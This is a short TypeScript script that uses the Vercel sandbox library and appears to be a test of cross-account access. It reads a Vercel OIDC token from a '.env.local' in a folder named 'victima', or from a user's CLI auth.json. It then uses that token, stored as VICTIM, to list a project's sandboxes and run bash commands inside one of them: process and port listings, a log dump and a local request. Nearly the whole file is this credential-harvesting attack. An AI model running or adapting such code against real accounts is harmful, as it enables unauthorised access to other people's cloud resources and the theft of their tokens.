import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
const names: string[] = ["ingress-echo-"];
const res: any = await (await import("/tmp/vercel-sandbox/node_modules/@vercel/sandbox/dist/api-client/api-client.js")).APIClient;
const client = new (res.default ?? res)({ token: VICTIM, teamId, projectId });
const list: any = await client.listSandboxes({ projectId, limit: 50 });
const sbxs = list.json?.sandboxes ?? list.json ?? [];
const target = sbxs.find((s: any) => s.name?.startsWith("ingress-echo-"));
console.log("found:", target?.name);
if (target) {
  const s = await Sandbox.get({ name: target.name, token: VICTIM, teamId, projectId });
  const r = await s.runCommand("bash", ["-c", `echo "=== proceso ==="; ps aux | grep -v grep | grep echo.py; echo "=== puerto 3000 ==="; ss -tlnp 2>/dev/null | grep 3000 || netstat -tlnp 2>/dev/null | grep 3000; echo "=== log ==="; cat /tmp/echo.log 2>/dev/null; echo "=== test local ==="; curl -s --max-time 3 http://127.0.0.1:3000/ | head -10`], { wait: true, timeout: 30_000 });
  console.log(await r.output("both"));
}
